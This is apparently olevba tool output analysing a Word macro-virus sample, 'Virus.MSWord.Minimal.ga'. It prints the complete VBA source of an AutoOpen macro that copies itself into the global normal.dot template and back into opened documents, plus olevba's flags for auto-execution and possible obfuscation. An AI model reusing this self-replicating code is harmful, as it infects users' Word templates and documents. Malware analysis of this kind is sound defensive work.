olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.ga-5d9f0e4ae205032913d96e043af6be7059df3ab0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.ga-5d9f0e4ae205032913d96e043af6be7059df3ab0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoopen.bas 
in file: Virus.MSWord.Minimal.ga-5d9f0e4ae205032913d96e043af6be7059df3ab0 - OLE stream: 'Macros/VBA/autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$
Dim b$
Dim c$
a$ = "autoopen"
b$ = WordBasic.[FileName$]()
c$ = WordBasic.[DefaultDir$](2) + "\normal.dot"
Dim a_ As Object: Set a_ = WordBasic.DialogRecord.Organizer(False)
Set a_ = WordBasic.CurValues.Organizer
a_.Copy = 1
a_.Tab = 3
a_.Name = a$
a_.Source = b$
a_.Destination = c$
On Error Resume Next
WordBasic.Organizer a_
If WordBasic.CountMacros(1) = 0 Then
a_.Source = c$
a_.Destination = b$
WordBasic.Organizer a_
WordBasic.FileSaveAs Format:=1
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

